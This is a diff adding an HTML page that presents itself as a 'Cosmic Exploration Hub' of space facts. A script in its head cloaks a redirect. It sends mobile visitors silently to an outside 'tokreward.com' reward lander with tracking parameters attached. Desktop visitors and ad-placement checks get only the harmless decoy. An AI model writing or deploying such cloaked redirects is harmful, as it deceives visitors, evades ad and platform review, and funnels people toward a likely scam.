@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://tokreward.com/api/v5/entry?s1=${s}&ttclid=${ttclid}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cosmic Exploration Hub</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background: linear-gradient(45deg, #2c3e50, #3498db);
+            color: #ecf0f1;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            padding: 20px;
+        }
+        header {
+            grid-column: 1 / -1;
+            text-align: center;
+            background-color: rgba(52, 152, 219, 0.7);
+            padding: 20px;
+            border-radius: 10px;
+        }
+        main {
+            grid-column: 1 / 3;
+            background-color: rgba(44, 62, 80, 0.7);
+            padding: 20px;
+            border-radius: 10px;
+        }
+        aside {
+            grid-column: 3 / 4;
+            background-color: rgba(52, 152, 219, 0.7);
+            padding: 20px;
+            border-radius: 10px;
+        }
+        footer {
+            grid-column: 1 / -1;
+            text-align: center;
+            background-color: rgba(44, 62, 80, 0.7);
+            padding: 10px;
+            border-radius: 10px;
+        }
+        h1, h2 {
+            color: #f39c12;
+        }
+        a {
+            color: #e74c3c;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>Cosmic Exploration Hub</h1>
+        </header>
+        <main>
+            <h2>Discover the Universe</h2>
+            <p>Embark on a journey through the cosmos, exploring distant galaxies and unraveling the mysteries of space.</p>
+        </main>
+        <aside>
+            <h2>Space Facts</h2>
+            <ul>
+                <li>There are more stars in the universe than grains of sand on Earth.</li>
+                <li>The largest known star, UY Scuti, is over 1,700 times larger than our Sun.</li>
+            </ul>
+        </aside>
+        <footer>
+            <a href="https://tokreward.com/privacy.html">Privacy Policy</a>
+        </footer>
+    </div>
+</body>
+</html>
